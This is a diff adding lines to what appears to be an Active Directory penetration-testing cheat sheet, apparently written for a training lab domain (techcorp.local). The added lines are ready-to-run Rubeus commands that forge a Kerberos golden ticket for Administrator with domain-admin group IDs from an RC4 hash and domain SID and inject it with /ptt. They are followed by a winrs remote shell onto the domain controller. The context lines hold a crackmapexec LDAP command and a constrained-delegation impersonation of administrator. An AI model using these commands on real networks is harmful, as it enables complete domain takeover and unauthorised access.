@@ -160,3 +160,13 @@ sudo crackmapexec ldap dc01.doamin.local -u 'uname' -p 'passwd' --kdcHost dc01.d
 
 **Ex**
 [Rubeus.Program]::Main("$constr_srv_for_us /user:student72$ /aes256:038cc0e32fbb521fdda1e5f6ef98fee2df844f43cbc9c676edc7d514907a86f1 /msdsspn:http/us-helpdesk /impersonateuser:administrator /ptt".Split(" "));
+
+
+# Golden Ticket
+[Rubeus.Program]::Main("$golden /rc4:b0975ae49f441adc6b024ad238935af5 /ldap /sid:S-1-5-21-210670787-2521448726-163245708 /user:Administrator /printcmd".Split(" "));
+
+
+[Rubeus.Program]::Main("$golden /rc4:B0975AE49F441ADC6B024AD238935AF5 /user:Administrator /id:500 /pgid:513 /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /minpassage:1 /logoncount:346 /netbios:US /groups:544,512,520,513 /dc:US-DC.us.techcorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt".Split(" "));
+
+
+winrs -r:us-dc.us.techcorp.local cmd
